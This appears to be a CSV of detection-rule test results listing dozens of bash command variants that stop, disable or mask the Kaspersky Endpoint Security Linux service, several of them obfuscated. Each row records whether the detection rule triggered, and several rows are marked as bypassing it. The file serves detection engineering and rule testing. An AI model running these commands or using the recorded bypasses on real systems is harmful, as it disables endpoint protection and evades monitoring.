ID,Command,Log File,Result,All Detected Rules
39,"/bin/bash -c ""systemctl stop kesl && systemctl disable ''kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack39.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
51,"/bin/bash -c ""systemctl --now stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack51.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
52,"/bin/bash -c ""systemctl --force stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack52.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
53,"/bin/bash -c ""systemctl --no-block stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack53.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
54,"/bin/bash -c ""systemctl --quiet stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack54.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
55,"/bin/bash -c ""systemctl --quiet disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack55.log,Bypass Target Rule,Disable Or Stop Services | Syslog Clearing or Removal Via System Utilities
56,"/bin/bash -c ""systemctl --now disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack56.log,Bypass Target Rule,Disable Or Stop Services | Syslog Clearing or Removal Via System Utilities
57,"/bin/bash -c ""systemctl --force disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack57.log,Bypass Target Rule,Disable Or Stop Services | Syslog Clearing or Removal Via System Utilities
58,"/bin/bash -c ""systemctl --no-block disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack58.log,Bypass Target Rule,Disable Or Stop Services | Syslog Clearing or Removal Via System Utilities
59,"/bin/bash -c ""systemctl --now stop kesl && systemctl --now disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack59.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
60,"/bin/bash -c ""systemctl stop kesl.service && systemctl disable kesl.service""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack60.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
61,"/bin/bash -c ""systemctl --now mask kesl.service""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack61.log,Bypass Target Rule,System Information Discovery | Syslog Clearing or Removal Via System Utilities
62,"/bin/bash -c ""systemctl mask kesl && systemctl stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack62.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
63,"/bin/bash -c ""systemctl disable --now kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack63.log,Bypass Target Rule,System Information Discovery | Disable Or Stop Services | Syslog Clearing or Removal Via System Utilities
64,"/bin/bash -c ""systemctl stop --quiet kesl && systemctl disable --quiet kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack64.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
65,"/bin/bash -c ""systemctl --now disable kesl.service""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack65.log,Bypass Target Rule,System Information Discovery | Disable Or Stop Services | Syslog Clearing or Removal Via System Utilities
66,"/bin/bash -c ""systemctl --no-pager stop kesl && systemctl --no-pager disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack66.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
67,"/bin/bash -c ""env SYSTEMD_LOG_LEVEL=emerg systemctl stop kesl && systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack67.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Syslog Clearing or Removal Via System Utilities | System Information Discovery | Local System Accounts Discovery - Linux | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux
68,"/bin/bash -c ""/usr/bin/systemctl stop kesl && /usr/bin/systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack68.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
69,"/bin/bash -c ""/bin/systemctl stop kesl && /bin/systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack69.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
70,"/bin/bash -c ""exec systemctl stop kesl && exec systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack70.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
71,"/bin/bash -c ""$(which systemctl) stop kesl && $(which systemctl) disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack71.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
72,"/bin/bash -c ""systemctl disable kesl && systemctl stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack72.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
73,"/bin/bash -c ""systemctl --runtime stop kesl && systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack73.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
74,"/bin/bash -c ""systemctl stop kesl.service && systemctl mask kesl.service""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack74.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
75,"/bin/bash -c ""SYSTEMD_LOG_TARGET=null systemctl stop kesl && systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack75.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
76,"/bin/bash -c ""SYSTEMD_EDITOR=true systemctl disable kesl && systemctl stop kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack76.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
77,"/bin/bash -c ""nohup systemctl stop kesl >/dev/null 2>&1 &""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack77.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities | Nohup Execution
78,"/bin/bash -c ""nohup systemctl disable kesl >/dev/null 2>&1 &""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack78.log,Bypass Target Rule,System Information Discovery | Disable Or Stop Services | Syslog Clearing or Removal Via System Utilities | Nohup Execution
79,"/bin/bash -c ""timeout 2 systemctl stop kesl && timeout 2 systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack79.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
80,"/bin/bash -c ""stdbuf -oL systemctl stop kesl && stdbuf -oL systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack80.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
81,"/bin/bash -c ""systemctl --plain stop kesl && systemctl --plain disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack81.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
82,"/bin/bash -c ""LC_ALL=C systemctl stop kesl && LC_ALL=C systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack82.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
83,"/bin/bash -c ""systemctl stop kesl && sleep 1 && systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack83.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
84,"/bin/bash -c ""eval 'systemctl stop kesl' && eval 'systemctl disable kesl'""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack84.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
85,"/bin/bash -c ""echo stop | xargs -I{} systemctl {} kesl && echo disable | xargs -I{} systemctl {} kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack85.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
86,"/bin/bash -c ""bash -c 'systemctl stop kesl && systemctl disable kesl'""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack86.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
87,"/bin/bash -c ""/bin/bash -c 'systemctl stop kesl && systemctl disable kesl'""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack87.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
88,"/bin/bash -c ""command systemctl stop kesl && command systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack88.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
89,"/bin/bash -c ""$(echo c3lzdGVtY3Rs | base64 -d) stop kesl && systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack89.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Syslog Clearing or Removal Via System Utilities | System Information Discovery | Disable Or Stop Services | Decode Base64 Encoded Text | Kaspersky Endpoint Security Stopped Via CommandLine - Linux
90,"/bin/bash -c ""$(echo c3lzdGVtY3Rs | xxd -r -p) stop kesl && systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack90.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
91,"/bin/bash -c ""$(printf 'systemctl') stop kesl && systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack91.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
92,"/bin/bash -c ""alias sctl='systemctl'; sctl stop kesl && sctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack92.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
93,"/bin/bash -c ""export CMD=systemctl; $CMD stop kesl && $CMD disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack93.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
94,"/bin/bash -c ""bash -c \""systemctl stop kesl\"" && bash -c \""systemctl disable kesl\""""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack94.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
95,"/bin/bash -c ""sh -c 'systemctl stop kesl' && sh -c 'systemctl disable kesl'""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack95.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
96,"/bin/bash -c ""((systemctl stop kesl)); ((systemctl disable kesl))""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack96.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
97,"/bin/bash -c ""for i in stop disable; do systemctl \$i kesl; done""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack97.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
98,"/bin/bash -c ""IFS=' ' read -ra CMDS <<< 'stop disable'; for cmd in \""\${CMDS[@]}\""; do systemctl \$cmd kesl; done""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack98.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,Syslog Clearing or Removal Via System Utilities | System Information Discovery | Local System Accounts Discovery - Linux | Disable Or Stop Services | File and Directory Discovery - Linux | Chmod Suspicious Directory | File Deletion | Kaspersky Endpoint Security Stopped Via CommandLine - Linux
99,"/bin/bash -c ""`echo systemctl` stop kesl && `echo systemctl` disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack99.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
101,"/bin/bash -c ""echo 'systemctl stop kesl && systemctl disable kesl' | bash""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack101.log,Trigger: Kaspersky Endpoint Security Stopped Via CommandLine - Linux,System Information Discovery | Disable Or Stop Services | Kaspersky Endpoint Security Stopped Via CommandLine - Linux | Syslog Clearing or Removal Via System Utilities
102,"/bin/bash -c ""systemctl disable kesl""",Kaspersky_Endpoint_Security_Stopped_Via_CommandLine_attack102.log,Bypass Target Rule,System Information Discovery | Disable Or Stop Services | Syslog Clearing or Removal Via System Utilities
